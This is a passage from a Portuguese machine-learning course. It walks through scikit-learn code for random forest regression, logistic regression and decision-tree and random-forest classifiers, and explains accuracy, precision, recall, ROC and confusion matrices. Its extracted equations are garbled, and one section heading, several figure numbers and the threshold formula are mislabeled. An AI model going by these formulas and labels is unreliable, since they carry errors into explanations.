KNN implementado pela biblioteca scikit-learn não possui o cálculo de 
importância das variáveis de forma direta como na árvore de regressão. Para 
contornar isso, existe uma outra metodologia, também disponível na biblioteca 
scikit-learn, que avalia a contribuição das variáveis para qualquer modelo, não 
só o KNN, e por isso será utilizada aqui. O trecho de código abaixo exibe a 
implementação. 
 
 
Figura 3.27: Implementação do cálculo da importância de variáveis por meio de 
permutação 
 
 

 
 
A Figura 3.27 é apenas um trecho da implementação completa do 
problema, no qual já foi feito o pré-processamento dos dados, divisão em treino 
e teste, transformação e ajuste do modelo. A primeira célula da figura mostra a 
importação da biblioteca e a chamada ao método que efetivamente calcula a 
importância. É possível controlar a quantidade de repetições para o processo por 
meio do parâmetro n_repeats (segunda linha da primeira célula na Figura 3.27). 
A segunda célula mostrada na figura monta um dataframe para armazenar a 
importância e já dispões as variáveis em ordem decrescente, uma vez que 
quanto maior o valor, mais importante é a variável.  
 
 
Figura 3.28: Importância das variáveis no algoritmo KNN 
 
A Figura 3.28 acima (implementada da mesma maneira que a Figura 3.24) 
apresenta de maneira gráfica a importância das variáveis no modelo KNN assim 
como feito na árvore de regressão. Aqui foi utilizada a metodologia de 
permutação e é perceptível que a variável mais impactante no modelo é a 

 
 
mediana do salário, seguida pela latitude. Em projetos de ML é importante, além 
de bons resultados, conseguir explicá-los, entender as variáveis que impactam 
os modelos e tentar inferir a causa dessa importância. Esse tipo de 
conhecimento é essencial para a área de negócios de uma empresa que está 
utilizando análise avançada para evoluir. Aqui nesse texto não iremos aprofundar 
nas causas dessa importância de variáveis e a explicabilidade dos modelos, 
ficando a cargo do leitor mergulhar nos estudos e conseguir aplicar os conceitos 
em diferentes cenários. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
3.5 MODELO DE REGRESSÃO BASEADO NO ALGORITMO DOS K VIZINHOS 
MAIS PRÓXIMOS 
 
A expressão florestas aleatórias é bastante sugestiva a partir do momento 
em que modelos baseados em árvores já foram explorados. Resumidamente, o 
algoritmo floresta aleatória (Random Forest – RF) é constituído por várias 
árvores, ou seja, são vários modelos de árvore compondo um conjunto e que 
trabalham para realizar uma predição ou uma classificação. Essa abordagem de 
aprendizado em conjunto (Ensemble Learning) é bastante poderosa, uma vez 
que obtém os resultados de todos os modelos e faz uma média entre todos para 
gerar o resultado (isso quando se trata de um problema de regressão). É possível 
criar ensembles com outros modelos de ML, sejam todos do mesmo tipo dentro 
do grupo ou mesmo de tipos distintos. 
Uma maneira de tornar os algoritmos ainda mais robustos é a aplicação 
da técnica bagging, que em tradução literal seria algo como ensacamento. Essa 
abordagem separa aleatoriamente o conjunto de dados de treinamento em 
diversos subconjuntos que são aplicados aos diferentes modelos dentro do 
ensemble. Cada modelo é treinado em um subconjunto e faz sua predição para 
no fim, serem combinadas (média dos valores preditos) em uma resposta. 
 
Os trechos de código a seguir mostram a implementação completa, desde 
leitura e pré-processamento dos dados até o treinamento e avaliação do modelo 
RF. A estratégia seguida aqui é a mesma utilizada anteriormente para os outros 
modelos de regressão. Diferentemente do que foi mostrado até aqui, esse 
exemplo foi implementado utilizando um arquivo único com extensão .py que é 
o padrão do Python. Além disso, foi utilizado o PyCharm como editor de código. 
 
 
 
 

 
 
import numpy as np 
import pandas as pd 
import matplotlib.pyplot as plt 
import seaborn as sns 
from sklearn.impute import SimpleImputer 
from sklearn.preprocessing import StandardScaler, 
MinMaxScaler 
from sklearn.model_selection import train_test_split 
from sklearn.ensemble import RandomForestRegressor 
from sklearn.metrics import r2_score, 
mean_absolute_percentage_error 
 
#Ler os dados 
df = pd.read_csv('california_housing.csv') 
 
#Remover dados nulos 
imputer = SimpleImputer(strategy='mean') 
clean_data = imputer.fit_transform(df[['total_bedrooms']]) 
df['total_bedrooms'] = clean_data 
 
#Criar variáveis dummy a partir da variável categórica 
ocean_proximity 
df_ocean_proximity = pd.get_dummies(df['ocean_proximity'], 
drop_first=True, dtype=int) 
df = pd.concat([df, df_ocean_proximity], axis=1) 
df.drop('ocean_proximity', axis=1, inplace=True) 
 
#Preparação dos dados para inserir no modelo 
X = df.copy() 
y = X.pop('median_house_value') 
 
#Separar os dados em treino e teste 
X_train, X_test, y_train, y_test = train_test_split(X, y, 
test_size=0.3, random_state=0) 
X_train.reset_index(drop=True, inplace=True) 
X_test.reset_index(drop=True, inplace=True) 
y_train.reset_index(drop=True, inplace=True) 
y_test.reset_index(drop=True, inplace=True) 
 
 
 
 

 
 
 
#Transformar os dados 
scaler = StandardScaler() 
 
data_transformed_train = 
scaler.fit_transform(X_train.drop(['INLAND', 'ISLAND', 
'NEAR BAY', 'NEAR OCEAN'], axis=1)) 
X_train_transformed = 
pd.DataFrame(data=data_transformed_train, 
columns=X_train.drop(['INLAND', 'ISLAND', 'NEAR BAY', 
                                                                       
'NEAR OCEAN'], axis=1).columns) 
X_train_transformed = pd.concat([X_train_transformed, 
X_train[['INLAND', 'ISLAND', 'NEAR BAY', 'NEAR OCEAN']]], 
axis=1) 
 
data_transformed_test = 
scaler.transform(X_test.drop(['INLAND', 'ISLAND', 'NEAR 
BAY', 'NEAR OCEAN'], axis=1)) 
X_test_transformed = 
pd.DataFrame(data=data_transformed_test, 
columns=X_test.drop(['INLAND', 'ISLAND', 'NEAR BAY', 
                                                                       
'NEAR OCEAN'], axis=1).columns) 
X_test_transformed = pd.concat([X_test_transformed, 
X_test[['INLAND', 'ISLAND', 'NEAR BAY', 'NEAR OCEAN']]], 
axis=1) 
 
#Instanciar e treinar o modelo de floresta aleatória 
rf = RandomForestRegressor(random_state=0) 
rf.fit(X_train_transformed, y_train) 
 
#Predições do modelo utilizando os dados de teste 
y_pred = rf.predict(X_test_transformed) 
 
#Gerar métricas para avaliar a qualidade do modelo 
r2_test = np.round(r2_score(y_test, y_pred),4) 
mape_test = np.round(mean_absolute_percentage_error(y_test, 
y_pred),4) 
 
print(f'R2: {r2_test}\n') 
print(f'MAPE: {mape_test}\n') 
 
 
 
 
 
 
 

 
 
 
#Gerar importância das variáveis 
df_importancia = 
pd.DataFrame({'Variáveis':list(rf.feature_names_in_), 
                               
'Importância':list(rf.feature_importances_)}) 
df_importancia = 
df_importancia.sort_values(by='Importância', 
ascending=False, ignore_index=True).copy() 
#Gerar gráfico de importância 
plt.figure(figsize=(8,6)) 
sns.barplot(data=df_importancia, x='Importância', 
y='Variáveis') 
plt.xlabel('Importância', fontsize=12, fontweight='bold') 
plt.ylabel('Variáveis', fontsize=12, fontweight='bold') 
plt.title('Importância das variáveis no algoritmo Random 
Forest', fontsize=12, fontweight='bold') 
plt.savefig('./rf_importancia_variaveis_california_house.pn
g', bbox_inches='tight') 
 
#Gerar gráfico de real x predito 
plt.figure(figsize=(10,8)) 
plt.plot(y_test.iloc[-100:].values) 
plt.plot(y_pred[-100:,]) 
plt.title('Comparação real x predito para o algoritmo 
Random Forest', fontsize=14, fontweight='bold') 
plt.xlabel('Amostra', fontsize=12, fontweight='bold') 
plt.ylabel('Preço mediano da casa', fontsize=12, 
fontweight='bold') 
plt.legend(['Real', 'Predito']) 
plt.savefig('./rf_real_x_predito_california_house.png') 
 
O resultado foi positivo comparado aos anteriores (árvore de regressão e 
KNN). Avaliando as métricas, o RF obteve R2 = 81,54% e MAPE = 17,95% 
indicando desempenho superior na resolução do problema de preços das casas 
na California. 
A Figura 3.28 abaixo apresenta a comparação entre os valores reais e 
preditos para o preço mediano das casas na California. Comparando com a 
Figura 3.26 referente ao KNN não é possível ver uma diferença perceptível na 
qualidade das respostas, ou seja, as predições do RF parecem acompanhar os 
dados reais tão bem quanto as predições do KNN. 

 
 
 
Figura 3.28: Valores reais e preditos (RF) para o problema do preço das casas 
na California 
 
 
Figura 3.29: Importância das variáveis no algoritmo RF 

 
 
UNIDADE 4 APRENDIZADO SUPERVISIONADO – 
CLASSIFICAÇÃO PARTE 1 
 
Nesta unidade, exploraremos os princípios da classificação, uma das tarefas 
executadas por modelos de machine learning supervisionados. Alguns conceitos 
relacionados à avaliação da qualidade dos modelos serão explorados como a 
curva ROC e as métricas 
 
OBJETIVOS DA UNIDADE 4 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar algoritmos de classificação 
 
• Analisar resultados e comparar diferentes abordagens de machine 
learning 
 

 
 
4.1. REGRESSÃO LOGÍSTICA 
Algoritmos de classificação trabalham com o objetivo de separar os dados 
em classes distintas. No geral, eles aplicam funções aos dados e conseguem 
calcular a probabilidade de os dados pertencerem a uma classe. A regressão 
logística faz exatamente isso por meio da função sigmoid (Equação 4.1). 
 
𝜎(𝑥) =
"
",$!"                                           Equação 4.1 
 
A representação gráfica dessa função é mostrada na Figura 4.1 abaixo. 
 
 
Figura 4.1: Gráfico da função sigmoid 

 
 
Essa função possui uma característica muito interessante que é possuir 
valores no intervalo [0, 1]. Esse fato a torna muito boa para fazer classificações 
binárias. De uma maneira muito simples e sem entrar nos detalhes matemáticos 
mais complexos, é possível entender que se estamos tratando de um valor x que 
irá resultar em uma resposta y, a medida em que esse valor x aumenta, a 
resposta estará mais próxima de 1, e, ao diminuir os valores de x, a resposta 
tende a ficar mais próxima de 0. Veja novamente a curva na Figura 4.1 e faça 
uma reflexão a respeito disso. Dessa forma, a expressão abaixo resume esse 
raciocínio. 
 
𝑦= D0 𝑠𝑒 𝑥< 0.5
1 𝑠𝑒 𝑥≥0.5                                   Equação 4.2 
 
Vale reforçar que existe todo um formalismo matemático envolvendo 
probabilidades e cálculos para o desenvolvimento do algoritmo de regressão 
logística que não são objetivo desse texto. O leitor pode buscar se aprofundar 
nos conceitos em outros materiais (Morettin & Singer, 2023). 
Essa reflexão em cima do gráfico é simples e ajuda a entender o racional 
por trás do modelo de regressão logística, mas vale destacar que problemas com 
diversas variáveis podem ser resolvidos e não apenas uma como exibido no 
racional da Equação 6. Em resumo, esse modelo é ajustado para calcular a 
probabilidade de um conjunto de dados serem pertencentes a uma classe ou 
outra. 
Será apresentado agora um exemplo prático de implementação da 
regressão logística para classificar um conjunto de dados de celulares. O dataset 
(Figura 4.2) apresenta uma série de características relativas aos telefones como 
capacidade da bateria, velocidade do processador, se possui suporte a dois 
chips, se possui 3G, se possui 4G, quantidade de pixels na vertical, quantidade 
de pixels na horizontal, quantidade de memória ram, quantidade de memória de 
armazenamento, se possui tela sensível ao toque, se possui wi-fi dentre algumas 

 
 
outras. A variável alvo é a faixa de preço à qual o celular pertence. O dataset 
possui quatro faixas distintas, mas para fins práticos desse texto, iremos utilizar 
apenas duas (classificação binária). Vale ressaltar que é possível classificar mais 
de duas classes, mas não será abordado aqui. 
 
 
Figura 4.2: Dataset contendo dados para o problema de classificação de faixa 
de preço de celulares 
 
A Figura 4.2 mostra os dados disponíveis para treinar e testar o modelo 
de regressão logística sendo a última coluna (price_range) o alvo. O conjunto de 
dados possui 2000 amostras, mas como dito anteriormente, houve a remoção 
de dados pertencentes a duas classes e com isso, o novo conjunto de dados 
possui 1000 amostras e 17 variáveis. Abaixo segue a implementação do código 
que faz o pré-processamento dos dados, treina e testa a regressão logística. 
 
import numpy as np 
import pandas as pd 
import matplotlib.pyplot as plt 
import seaborn as sns 
from sklearn.preprocessing import StandardScaler 
from sklearn.model_selection import train_test_split 
from sklearn.linear_model import LogisticRegression 
from sklearn.metrics import accuracy_score, 
precision_score, f1_score, recall_score, roc_auc_score, 

 
 
roc_curve, RocCurveDisplay, ConfusionMatrixDisplay 
 
excluir = ['n_cores', 'fc', 'pc'] 
categoricas = ['blue', 'dual_sim', 'four_g', 'three_g', 
'touch_screen', 'wifi'] 
 
#Ler os dados 
df = pd.read_excel('data.xlsx', engine='openpyxl') 
 
#Excluir colunas 
df.drop(excluir, axis=1, inplace=True) 
 
# Excluir dados de price_range = 0 e price_range = 3 
df = df[df['price_range'].isin([1, 2])].copy() 
df.reset_index(drop=True, inplace=True) 
 
 
#Converter a variável alvo price_range de valores iguais a 
1 e 2 para 0 e 1 
df_price_range = pd.get_dummies(df['price_range'], 
drop_first=True, dtype=int) 
df = pd.concat([df, df_price_range], axis=1) 
df.drop('price_range', axis=1, inplace=True) 
df.rename(columns={2:'price_range'}, inplace=True) 
 
#Preparação dos dados para inserir no modelo 
X = df.copy() 
y = X.pop('price_range') 
 
#Separar os dados em treino e teste 
X_train, X_test, y_train, y_test = train_test_split(X, y, 
test_size=0.3, random_state=0) 
X_train.reset_index(drop=True, inplace=True) 
X_test.reset_index(drop=True, inplace=True) 
y_train.reset_index(drop=True, inplace=True) 
y_test.reset_index(drop=True, inplace=True) 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
#Transformar os dados 
scaler = StandardScaler() 
 
data_transformed_train = 
scaler.fit_transform(X_train.drop(categoricas, axis=1)) 
X_train_transformed = 
pd.DataFrame(data=data_transformed_train, 
columns=X_train.drop(categoricas, axis=1).columns) 
X_train_transformed = pd.concat([X_train_transformed, 
X_train[categoricas]], axis=1) 
 
data_transformed_test = 
scaler.transform(X_test.drop(categoricas, axis=1)) 
X_test_transformed = 
pd.DataFrame(data=data_transformed_test, 
columns=X_test.drop(categoricas, axis=1).columns) 
X_test_transformed = pd.concat([X_test_transformed, 
X_test[categoricas]], axis=1) 
 
#Instanciar e treinar o modelo de regressão logística 
lr = LogisticRegression(random_state=0) 
lr.fit(X_train_transformed, y_train) 
 
#Predições do modelo utilizando os dados de teste 
y_pred = lr.predict(X_test_transformed) 
 
#Gerar métricas para avaliar a qualidade do modelo 
accuracy_test = np.round(accuracy_score(y_test, y_pred),4) 
precision_test = np.round(precision_score(y_test, 
y_pred),4) 
f1_test = np.round(f1_score(y_test, y_pred),4) 
recall_test = np.round(recall_score(y_test, y_pred),4) 
roc_test = roc_auc_score(y_test, 
lr.predict_proba(X_test_transformed)[:, 1]) 
 
print(f'Accuracy: {accuracy_test}\n') 
print(f'Precision: {precision_test}\n') 
print(f'F1: {f1_test}\n') 
print(f'Recall: {recall_test}\n') 
print(f'ROC AUC: {roc_test}\n') 
 
 
 
 
 
 
 
 

 
 
 
#Gerar importância das variáveis 
df_importancia = 
pd.DataFrame({'Variáveis':list(lr.feature_names_in_), 
                               
'Importância':list(lr.coef_[0])}) 
df_importancia = 
df_importancia.sort_values(by='Importância', 
ascending=False, ignore_index=True).copy() 
 
#Gerar gráfico de importância 
plt.figure(figsize=(8,6)) 
sns.barplot(data=df_importancia, x='Importância', 
y='Variáveis') 
plt.xlabel('Importância', fontsize=12, fontweight='bold') 
plt.ylabel('Variáveis', fontsize=12, fontweight='bold') 
plt.title('Importância das variáveis no algoritmo regressão 
logística', fontsize=12, fontweight='bold') 
plt.savefig('./lr_feature_importance_phone_classification.p
ng', bbox_inches='tight') 
 
#Gerar gráfico da curva ROC 
x_diagonal = np.arange(0, 1.1, 0.1) 
y_diagonal = np.arange(0, 1.1, 0.1) 
 
fig, ax_roc = plt.subplots(figsize=(8, 6)) 
RocCurveDisplay.from_estimator(lr, X_test_transformed, 
y_test, ax=ax_roc) 
ax_roc.plot(x_diagonal, y_diagonal, color='r', linestyle='-
-') 
ax_roc.set_title('Receiver Operating Characteristic (ROC) 
curve', fontsize=12, fontweight='bold') 
ax_roc.grid(linestyle='--') 
fig.savefig('./roc_curve_logistic_regression.png', 
bbox_inches='tight') 
 
#Gerar gráfico da matriz de confusão 
fig, ax = plt.subplots(figsize=(8, 6)) 
ConfusionMatrixDisplay.from_estimator(lr, 
X_test_transformed, y_test, ax=ax) 
ax.set_title('Matriz de confusão', fontsize=12, 
fontweight='bold') 
ax.set_xlabel('Classes preditas' , fontsize=12, 
fontweight='bold') 
ax.set_ylabel('Classes verdadeiras' , fontsize=12, 
fontweight='bold') 
fig.savefig('./matriz_confusao_logistic_regression.png', 
bbox_inches='tight') 

 
 
Problemas de classificação precisam ser avaliados com métricas de 
qualidade distintas das métricas utilizadas em problemas de regressão. Aqui 
serão introduzidas acurácia (accuracy), precisão (precision), f1, revocação 
(recall), receiver operating characteristic (ROC), área debaixo da curva (AUC) e 
matriz de confusão. A métrica mais direta para medir a qualidade de um 
algoritmo de classificação é a sua acurácia que mede o percentual de acerto de 
forma direta, ou seja, a quantidade de acertos e erros e contabilizada e então os 
percentuais são gerados. O processo de avaliação da regressão logística é 
semelhante aos modelos de regressão. Após o treinamento do modelo, dados 
de teste separados são aplicados ao modelo que retorna as classificações e, a 
partir disso, sua performance é mensurada. O modelo de regressão logística 
implementado para classificar os celulares obteve acurácia = 97,67% no 
conjunto de dados de teste, o que é muito alto, indicando que o modelo acertou 
quase todas as classes. Veja a Figura 4.3 abaixo e será feita a discussão a 
respeito da matriz de confusão. 
 
 
Figura 4.3: Matriz de confusão para o problema de classificação de celulares 

 
 
A matriz de confusão é uma ferramenta muito útil na interpretação dos 
resultados de um modelo de classificação. Primeiramente, veja que a soma dos 
valores na matriz é igual à quantidade de dados no conjunto de teste 
(158+4+3+135 = 300), portanto, cada resposta do modelo foi contabilizada para 
a construção dessa matriz. O eixo x representa os valores preditos pelo modelo 
e o eixo y representa os valores reais. Dessa forma, a diagonal principal dessa 
matriz (158 e 135) representa as classes que o modelo acertou (seja para 0 ou 
para 1). O valor 158 (na parte superior esquerda) é lido como: a classe 
verdadeira é 0 e o modelo classificou como 0, isso é um verdadeiro positivo (VP). 
O valor 135 (na parte inferior direita) é lido como: a classe verdadeira é 1 e o 
modelo classificou como 1, isso é um verdadeiro negativo (VN). O valor 4 (na 
parte superior direita) é lido como: a classe verdadeira é 0 e modelo classificou 
como 1, isso é um falso negativo (FN). O valor 3 (na parte inferior esquerda) é 
lido como: a classe verdadeira é 1 e o modelo classificou como 0, isso é um falso 
positivo (FP). 
Uma outra maneira de verificar essa matriz e compreender melhor as 
nomenclaturas positivas e negativas é substituir o 0 por “+” e o 1 por “-“ tanto no 
eixo y quanto no eixo x, dessa forma a leitura fica mais simples. Isso se deve à 
representação teórica, entretanto, aqui está sendo apresentado um exemplo 
mais prático com classes definidas em 0 e 1. De forma direta, a leitura dessa 
matriz indica a contabilização das amostras no conjunto de teste em que o 
modelo acerta e erra as classes (0 ou 1). 
A partir dessas definições (VP, FN, FP, VN) fica mais simples explicar as 
próximas métricas. No exemplo atual obteve-se precisão = 97,12%, que também 
é um valor muito alto. De acordo com (Faceli et al., 2023) tem-se a definição de 
que precisão é a proporção de exemplos positivos classificados corretamente 
entre todos aqueles preditos como positivos. Seu cálculo pode ser feito por meio 
da Equação 4.3 abaixo. 
 
𝑝𝑟𝑒𝑐𝑖𝑠𝑖𝑜𝑛=
-.
-.,/.                                   Equação 4.3 

 
 
A próxima métrica a ser vista aqui é a revocação, que nesse exemplo foi 
igual a 97,83% e que corresponde à taxa de acerto na classe positiva, também 
é conhecida como sensibilidade ou taxa de verdadeiros positivos (Faceli et al., 
2023) (Equação 4.4). 
 
𝑟𝑒𝑐𝑎𝑙𝑙=
-.
-.,/0                                     Equação 4.4 
 
A média harmônica ponderada das duas métricas anteriores (precisão e 
revocação) é conhecida como F e quando se dá o mesmo peso à ambas, tem-
se o f1 (Faceli et al., 2023). A Equação 4.5 abaixo ilustra o cálculo de f1. 
 
𝑓1 =
!∗'#$2)3)45∗#$2%&&
'#$2)3)45,#$2%&&                                   Equação 4.5 
 
A precisão pode ser compreendida como a capacidade do modelo de 
classificar corretamente os elementos em suas respectivas classes e a 
revocação, na prática é a aptidão do modelo em identificar elementos da classe 
positiva. 
A análise ROC é uma importante análise gráfica para avaliação de 
modelos de classificação binária. Para facilitar o entendimento, vale relembrar 
que após o cálculo dos valores na função sigmoid obtém-se uma resposta 
contínua, e essa, por sua vez, é comparada em um limiar de 0.5 (Equação 4.2). 
Para calcular os valores que serão utilizados para fazer o gráfico da curva ROC, 
esse limiar de 0.5 é alterado e o respectivo resultado é armazenado. Dessa 
forma, tem-se um conjunto de resultados, um para cada limiar de probabilidade 
distinto. Para cada um desses resultados, são calculados VP, FN, FP e VN. A 
curva ROC pode então ser gerada ao colocar no eixo x os valores de FP e no 
eixo y os valores de VP. Lembrando que cada valor corresponde a um limiar de 

 
 
probabilidade distinto. A Figura 4.4 abaixo mostra a curva ROC para o problema 
de classificação de celulares. A linha diagonal tracejada em vermelho representa 
um modelo de classificação que produz resultados aleatórios. Modelos que 
possuam suas curvas abaixo dessa linha são ainda piores. O melhor dos casos 
é quando a curva está próxima do canto superior esquerdo da figura. Modelos 
que possuem curvas próximas à parte superior direita produzem somente 
resultados positivos e os que possuem curvas próximas à parte inferior esquerda 
produzem somente resultados negativos (Faceli et al., 2023). A curva ROC da 
Figura 39 está quase perfeita de acordo com o explicado acima, portanto, temos 
mais um indicativo de que a regressão logística é realmente muito boa em 
predizer as faixas de preço de celulares. 
 
 
Figura 4.4: Curva ROC para o problema de classificação de celulares 
 

 
 
Como última métrica a ser apresentada na análise desse exemplo temos 
a área debaixo da curva ROC. Como visto no gráfico da Figura 4.4 a AUC é 
praticamente 1, mais uma vez indicando um modelo excepcional na tarefa de 
classificação binária. O conceito de área debaixo de uma curva remete à teoria 
matemática de integrais estudada na disciplina de cálculo. Para um classificador 
de ML, quanto maior e mais próxima de 1 for sua AUC, melhor ele é. 
Para finalizar a análise do modelo de regressão logística vejamos como 
ficou o gráfico contendo a importância das variáveis. Reforça-se que essa é uma 
possível metodologia de análise de importância e fica a cargo do leitor 
aprofundar em demais abordagens. A Figura 4.5 apresenta um gráfico de barras 
contendo o valor da importância (coeficientes da regressão logística) para cada 
variável do problema de classificação de faixas de preço de celulares. 
 
 
Figura 4.5: Importância das variáveis no algoritmo regressão logística 
 

 
 
É possível ver no gráfico acima que a variável memória ram do celular é 
a mais impactante no modelo, seguida pela capacidade da bateria. Algumas 
variáveis possuem valores negativos de importância o que significa que seu 
impacto será na classe oposta e terão um efeito inversamente proporcional ao 
efeito das variáveis com valor positivo de importância. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
4.1. MODELO DE CLASSIFICAÇÃO BASEADO EM ÁRVORE 
 
O conceito de um modelo baseado em árvore já foi discutido nas seções 
anteriores relativas à regressão. A Figura 3.16 mostra um formato básico para 
um modelo de árvore e vale recapitular. Especificamente para a tarefa de 
classificação, o que muda é que agora, o modelo passa a se chamar árvore de 
decisão e sua saída não é mais constituída por um número contínuo, mas sim, 
por um valor que representa uma classe (0 ou 1). É perfeitamente possível que 
tenhamos ainda, problemas de classificação que envolvam mais do que duas 
classes distintas e uma árvore de classificação é capaz de lidar com tal situação. 
No mais, as métricas de avaliação da performance do modelo permanecem as 
mesmas, porém com alguns ajustes, especialmente na curva ROC. Tais ajustes 
não serão tratados nesse texto, mas o trecho de código abaixo implementa de 
forma básica o algoritmo para resolver o problema das faixas de preço de 
celulares. Dessa vez as quatros faixas de valores (alvo) foram mantidas no intuito 
de demonstrar um problema multiclasse. 
 
import numpy as np 
import pandas as pd 
import matplotlib.pyplot as plt 
import seaborn as sns 
from sklearn.preprocessing import StandardScaler 
from sklearn.model_selection import train_test_split 
from sklearn.tree import DecisionTreeClassifier 
from sklearn.metrics import accuracy_score, 
classification_report 
 
excluir = ['n_cores', 'fc', 'pc'] 
categoricas = ['blue', 'dual_sim', 'four_g', 'three_g', 
'touch_screen', 'wifi'] 
 
#Ler os dados 
df = pd.read_excel('data.xlsx', engine='openpyxl') 
 
#Excluir colunas 
df.drop(excluir, axis=1, inplace=True) 
 
 

 
 
 
#Preparação dos dados para inserir no modelo 
X = df.copy() 
y = X.pop('price_range') 
 
#Separar os dados em treino e teste 
X_train, X_test, y_train, y_test = train_test_split(X, y, 
test_size=0.3, random_state=0) 
X_train.reset_index(drop=True, inplace=True) 
X_test.reset_index(drop=True, inplace=True) 
y_train.reset_index(drop=True, inplace=True) 
y_test.reset_index(drop=True, inplace=True) 
 
 
#Transformar os dados 
scaler = StandardScaler() 
 
data_transformed_train = 
scaler.fit_transform(X_train.drop(categoricas, axis=1)) 
X_train_transformed = 
pd.DataFrame(data=data_transformed_train, 
columns=X_train.drop(categoricas, axis=1).columns) 
X_train_transformed = pd.concat([X_train_transformed, 
X_train[categoricas]], axis=1) 
 
data_transformed_test = 
scaler.transform(X_test.drop(categoricas, axis=1)) 
X_test_transformed = 
pd.DataFrame(data=data_transformed_test, 
columns=X_test.drop(categoricas, axis=1).columns) 
X_test_transformed = pd.concat([X_test_transformed, 
X_test[categoricas]], axis=1) 
 
#Instanciar e treinar o modelo de árvore de decisão 
dt = DecisionTreeClassifier(random_state=0) 
dt.fit(X_train_transformed, y_train) 
 
#Predições do modelo utilizando os dados de teste 
y_pred = dt.predict(X_test_transformed) 
 
#Gerar métricas para avaliar a qualidade do modelo 
accuracy_test = np.round(accuracy_score(y_test, y_pred),4) 
 
print(f'Accuracy: {accuracy_test}\n') 
print(classification_report(y_test, y_pred)) 
 
 
 
 

 
 
 
#Gerar importância das variáveis 
df_importancia = 
pd.DataFrame({'Variáveis':list(dt.feature_names_in_), 
                               
'Importância':list(dt.feature_importances_)}) 
df_importancia = 
df_importancia.sort_values(by='Importância', 
ascending=False, ignore_index=True).copy() 
 
#Gerar gráfico de importância 
plt.figure(figsize=(8,6)) 
sns.barplot(data=df_importancia, x='Importância', 
y='Variáveis') 
plt.xlabel('Importância', fontsize=12, fontweight='bold') 
plt.ylabel('Variáveis', fontsize=12, fontweight='bold') 
plt.title('Importância das variáveis no algoritmo árvore de 
decisão', fontsize=12, fontweight='bold') 
plt.savefig('./dt_feature_importance_phone_classification_f
ull_classes.png', bbox_inches='tight') 
 
Interessante perceber que a biblioteca scikit-learn consegue entender e 
tratar a variável alvo com valores inteiros representando as diferentes classes do 
problema (0, 1, 2 e 3), e, portanto, não há necessidade de aplicar one-hot-
encoding à variável alvo. 
A acurácia da árvore de decisão ao classificar quatro classes distintas foi 
igual a 84,83% que é um bom resultado. Além disso, scikit-learn fornece um 
método pronto para calcular as métricas de performance do modelo 
(classification_report), facilitando o cálculo. A Figura 4.6 abaixo mostra o relatório 
contendo os resultados das métricas do modelo. 
 

 
 
 
Figura 4.6: Relatório de classificação para a árvore de decisão 
 
As métricas de precisão, revocação e f1 são calculadas em relação à cada 
uma das classes, o que adiciona alguns detalhes ao cálculo e como já dito, tais 
modificações não serão tratadas nesse texto. O algoritmo de árvore de decisão 
faz um bom trabalho de classificação para esse problema das faixas de preço 
dos celulares, visto que todas as métricas estão relativamente próximas de 1. A 
Figura 4.7 abaixo mostra a importância das variáveis. 
 

 
 
 
Figura 4.7: Importância das variáveis no algoritmo árvore de decisão 
 
Novamente a memória ram e a bateria possuem muito impacto nos 
resultados do modelo de árvore de decisão. Como já explicado anteriormente, a 
importância das variáveis deve ser sempre avaliada com cautela, inclusive por 
outras estratégias, mas devido às mesmas variáveis aparecem como 
importantes em diferentes modelos leva a crer realmente que temos um caminho 
bem estabelecido para descrição dos resultados. A árvore de decisão forneceu 
resultados bastante consistentes mesmo ao avaliar os dados das quatro classes 
disponíveis (faixas de preços de celulares) mostrando que é um modelo de ML 
bastante poderoso e capaz. Um comentário adicional em relação ao conjunto de 
dados é que ele é perfeitamente balanceado, uma vez que das 2000 amostras 
disponíveis, existem 500 para cada classe. Em problemas da vida real esse 
equilíbrio é pouquíssimo provável e por isso as métricas de precisão, revocação 
e f1 auxiliam no entendimento dos resultados do modelo em conjuntos com 
amostras desbalanceadas, indicando se o modelo está propenso a classificar 
mais para um lado ou outro. 

 
 
UNIDADE 5 APRENDIZADO SUPERVISIONADO – 
CLASSIFICAÇÃO PARTE 2 
 
Nessa unidade daremos sequência ao estudo dos modelos supervisionados de 
classificação explorando alguns detalhes a mais que complementam a unidade 
anterior. 
 
OBJETIVOS DA UNIDADE 5 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar novos modelos supervisionados de classificação 
 
• Aplicar diferentes técnicas para mensurar a performance dos modelos 

 
 
5.1. MODELO DE CLASSIFICAÇÃO BASEADO EM FLORESTA ALEATÓRIA 
 
Seguindo o racional empregado na árvore de classificação, modelos 
baseados em floresta aleatória possuem um funcionamento muito semelhante 
ao já apresentado na seção sobre regressão, com exceção de que aqui também 
a saída será uma classe e não um valor contínuo. Um classificador baseado em 
floresta aleatória possui várias árvores de classificação em seu interior 
(ensemble) que irão gerar cada uma um resultado. Nesse momento uma votação 
é feita de modo que cada árvore indica a classe à qual cada amostra pertence e 
a classe vencedora (com mais votos) será o resultado do modelo. A diferença 
básica é que no modelo direcionado para problemas de regressão é feita uma 
média dos valores contínuos resultantes de cada árvore e não a votação. 
 
O trecho de código abaixo exemplifica a implementação de um modelo de 
floresta aleatória utilizando a biblioteca scikit-learn. O problema é o mesmo 
utilizado anteriormente (classificação de faixas de preços de celulares) e o 
código contém poucas alterações em relação ao da árvore de decisão. 
 
import numpy as np 
import pandas as pd 
import matplotlib.pyplot as plt 
import seaborn as sns 
from sklearn.preprocessing import StandardScaler 
from sklearn.model_selection import train_test_split 
from sklearn.ensemble import RandomForestClassifier 
from sklearn.metrics import accuracy_score, 
classification_report 
 
excluir = ['n_cores', 'fc', 'pc'] 
categoricas = ['blue', 'dual_sim', 'four_g', 'three_g', 
'touch_screen', 'wifi'] 
 
#Ler os dados 
df = pd.read_excel('data.xlsx', engine='openpyxl') 
 
#Excluir colunas 
df.drop(excluir, axis=1, inplace=True) 
 

 
 
#Preparação dos dados para inserir no modelo 
X = df.copy() 
y = X.pop('price_range') 
 
#Separar os dados em treino e teste 
X_train, X_test, y_train, y_test = train_test_split(X, y, 
test_size=0.3, random_state=0) 
X_train.reset_index(drop=True, inplace=True) 
X_test.reset_index(drop=True, inplace=True) 
y_train.reset_index(drop=True, inplace=True) 
y_test.reset_index(drop=True, inplace=True) 
 
#Transformar os dados 
scaler = StandardScaler() 
 
data_transformed_train = 
